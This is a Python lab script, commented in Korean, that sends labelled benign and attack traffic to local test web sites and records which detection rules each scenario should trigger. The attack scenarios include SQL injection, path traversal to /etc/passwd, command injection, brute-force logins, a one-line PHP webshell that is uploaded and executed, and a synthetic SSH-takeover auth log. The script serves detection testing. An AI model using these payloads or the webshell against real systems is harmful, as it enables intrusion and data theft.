#!/usr/bin/env python3
"""
로컬 테스트 사이트를 상대로 "정답을 아는" 트래픽을 만든다.

- 정상 사용자 트래픽(오탐 측정용)과, 유형별 공격 트래픽을 서로 다른 (가짜)공인 IP로 보낸다.
- 각 공격이 어떤 규칙으로 잡혀야 하는지(정답)를 ground_truth.json 에 기록한다.
- 공격은 오직 이 로컬 서버(127.0.0.1)에만 보낸다. 외부 사이트로는 아무것도 보내지 않는다.

TEST-NET IP 대역(198.51.100.x, 203.0.113.x)만 X-Forwarded-For 로 쓴다(공인이지만 실제로는
라우팅되지 않는 문서용 대역). 실행 전 lab/serve.sh start 로 서버를 띄워 둔다.
"""
from __future__ import annotations

import json
import subprocess
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path

LAB = Path(__file__).resolve().parent
SHOP = "http://127.0.0.1:8081"
BOARD = "http://127.0.0.1:8082"
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/140.0 Safari/537.36")

truth: list[dict] = []


def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, out=False):
    cmd = ["curl", "-s", "-o", "/dev/null" if not out else "-", "-w", "%{http_code}",
           "-H", f"X-Forwarded-For: {ip}", "-A", ua, "-X", method]
    for k, v in (data or {}).items():
        cmd += ["--data-urlencode", f"{k}={v}"]
    if data and method == "GET":
        cmd += ["-G"]
    for k, path in (form or {}).items():
        cmd += ["-F", f"{k}=@{path}"]
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout


def record(scenario, site, ip, rules, desc, malicious=True):
    truth.append({"scenario": scenario, "site": site, "attacker_ip": ip,
                  "expected_rules": rules, "description": desc, "malicious": malicious})


def benign():
    """정상 사용자 — 아무 규칙에도 안 걸려야 한다(오탐 측정)."""
    for ip in ("203.0.113.10", "203.0.113.11", "203.0.113.12"):
        req(f"{SHOP}/", ip)
        req(f"{SHOP}/search.php", ip, data={"q": "노트북"})
        req(f"{SHOP}/view.php", ip, data={"page": "about.txt"})
        req(f"{SHOP}/login.php", ip, method="POST", data={"username": "guest", "password": "guest"})
    for ip in ("203.0.113.20", "203.0.113.21"):
        req(f"{BOARD}/", ip)
        req(f"{BOARD}/bbs/list.php", ip, data={"id": "1"})
        req(f"{BOARD}/bbs/download.php", ip, data={"file": "notice.txt"})
        req(f"{BOARD}/bbs/login.php", ip, method="POST", data={"uid": "tester", "pw": "1234"})
    record("benign", "both", "203.0.113.*", [], "정상 사용자 트래픽", malicious=False)


def scan_recon():
    ip = "198.51.100.50"
    paths = ["/wp-login.php", "/wp-admin/", "/administrator/", "/phpmyadmin/", "/.git/HEAD",
             "/backup.zip", "/old/", "/test.php", "/config.bak", "/admin/", "/manager/html",
             "/xmlrpc.php", "/vendor/phpunit/", "/server-status", "/.svn/entries",
             "/cgi-bin/test.cgi", "/shell.php", "/db.sql", "/info.php", "/api/v1/users"]
    for p in paths:
        req(f"{SHOP}{p}", ip, ua="sqlmap/1.8.3#stable (https://sqlmap.org)")
    record("scanner_recon", "shopmall", ip, ["WEBLOG_SCANNER", "WEBLOG_ENUM_404"],
           "스캐너 UA + 없는 경로 20개 연속 탐색")


def sqli_dump():
    ip = "198.51.100.23"
    payloads = ["' UNION SELECT username,password FROM users-- -",
                "' OR '1'='1", "%' UNION SELECT username,password FROM users-- -",
                "' AND 1=2 UNION SELECT username,password FROM users-- -"]
    for q in payloads:
        req(f"{SHOP}/search.php", ip, data={"q": q})
    ipb = "198.51.100.63"
    for q in ["0 UNION SELECT uid,pw FROM members", "1 AND 1=1", "1; DROP TABLE x--",
              "0 UNION SELECT uid,pw FROM members-- -"]:
        req(f"{BOARD}/bbs/list.php", ipb, data={"id": q})
    record("sqli_dump", "shopmall", ip, ["WEBLOG_SQLI"], "검색창 UNION 기반 계정정보 추출")
    record("sqli_dump", "board", ipb, ["WEBLOG_SQLI"], "게시물 id UNION 기반 추출")


def traversal_lfi():
    ip = "198.51.100.24"
    for p in ["../../../../../../etc/passwd", "../../../../etc/passwd%00",
              "....//....//....//etc/passwd"]:
        req(f"{SHOP}/view.php", ip, data={"page": p})
    ipb = "198.51.100.64"
    req(f"{BOARD}/bbs/download.php", ipb, data={"file": "../../../../../../etc/passwd"})
    record("traversal_lfi", "shopmall", ip, ["WEBLOG_TRAVERSAL"], "경로 조작으로 /etc/passwd 열람")
    record("traversal_lfi", "board", ipb, ["WEBLOG_TRAVERSAL"], "다운로드 경로 조작")


def cmd_injection():
    ip = "198.51.100.65"
    for h in ["127.0.0.1;id", "127.0.0.1;cat /etc/passwd", "x|id", "x;uname -a"]:
        req(f"{BOARD}/admin/tools.php", ip, data={"host": h})
    record("cmd_injection", "board", ip, ["WEBLOG_CMD_INJECTION"], "점검 도구 host 파라미터 명령 삽입")


def sensitive_files():
    ip = "198.51.100.25"
    for p in ["/.env", "/config.php", "/wp-config.php", "/.git/config"]:
        req(f"{SHOP}{p}", ip)
    record("sensitive_files", "shopmall", ip, ["WEBLOG_SENSITIVE_FILE"], "설정·비밀 파일 접근 시도")


def brute_login():
    ip = "198.51.100.26"
    for i in range(15):
        req(f"{SHOP}/login.php", ip, method="POST",
            data={"username": "admin", "password": f"guess{i}"})
    req(f"{SHOP}/login.php", ip, method="POST", data={"username": "admin", "password": "S3cretPass!"})
    record("brute_login", "shopmall", ip,
           ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"],
           "로그인 15회 실패 뒤 정답으로 성공")
    ipb = "198.51.100.66"
    for i in range(12):
        req(f"{BOARD}/bbs/login.php", ipb, method="POST", data={"uid": "sysop", "pw": f"p{i}"})
    req(f"{BOARD}/bbs/login.php", ipb, method="POST", data={"uid": "sysop", "pw": "Adm!n2024"})
    record("brute_login", "board", ipb,
           ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"], "게시판 로그인 무차별 대입")


def webshell_chain():
    """가장 중요한 시나리오: 웹셸 업로드 → 디스크에 파일 생성 → 실행. '침해 확인' 이 나와야 한다."""
    ip = "198.51.100.27"
    # 테스트용 최소 웹셸(로컬 전용 아티팩트). 디스크에 실제로 남아 webscan 이 찾는다.
    shell = LAB / "runtime" / "art.php"
    shell.write_text("<?php system($_GET['cmd']); // local test webshell\n", encoding="utf-8")
    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(shell)})
    time.sleep(0.3)
    for c in ["id", "uname -a", "cat /etc/passwd"]:
        req(f"{SHOP}/uploads/art.php", ip, data={"cmd": c})
    record("webshell_chain", "shopmall", ip,
           ["WEBLOG_UPLOAD_EXEC", "WEBLOG_WEBSHELL_ACCESS", "FILE_WEBSHELL"],
           "웹셸 업로드 후 업로드 폴더의 .php 를 cmd 파라미터로 실행")


def write_synthetic_authlog():
    """웹 침해가 서버 계정 탈취로 이어진 상황을 보여 주려고 auth.log 를 합성한다.
    (로컬에서 실제 SSH 무차별 대입을 돌리기 어려워 합성하며, 문서에 그 사실을 밝힌다.)
    공격자 IP는 웹셸 시나리오와 같은 198.51.100.27 로 맞춰 교차 상관을 확인한다."""
    ip = "198.51.100.27"
    base = datetime.now(timezone.utc).replace(microsecond=0)
    lines = []
    t = base
    for i in range(8):
        t += timedelta(seconds=3)
        lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sshd[2200{i}]: "
                     f"Failed password for root from {ip} port 4{i}122 ssh2")
    t += timedelta(seconds=3)
    lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sshd[22099]: "
                 f"Accepted password for root from {ip} port 49999 ssh2")
    t += timedelta(seconds=5)
    lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sudo:     root : "
                 f"TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m svc")
    (LAB / "logs" / "shopmall_auth.log").write_text("\n".join(lines) + "\n", encoding="utf-8")
    record("ssh_takeover", "shopmall", ip,
           ["SSH_BRUTE_FORCE", "SSH_SUCCESS_AFTER_FAIL"],
           "웹 침해와 같은 IP에서 SSH 무차별 대입 후 root 로그인 성공(합성 auth.log)")


def main():
    benign()
    scan_recon()
    sqli_dump()
    traversal_lfi()
    cmd_injection()
    sensitive_files()
    brute_login()
    webshell_chain()
    write_synthetic_authlog()
    (LAB / "logs" / "ground_truth.json").write_text(
        json.dumps({"generated_at": datetime.now(timezone.utc).isoformat(), "scenarios": truth},
                   ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"공격 트래픽 생성 완료: 시나리오 {len(truth)}개")
    for t in truth:
        print(f"  [{t['scenario']:16s}] {t['site']:9s} {t['attacker_ip']:15s} "
              f"→ 기대규칙 {', '.join(t['expected_rules']) or '(없음/정상)'}")


if __name__ == "__main__":
    main()
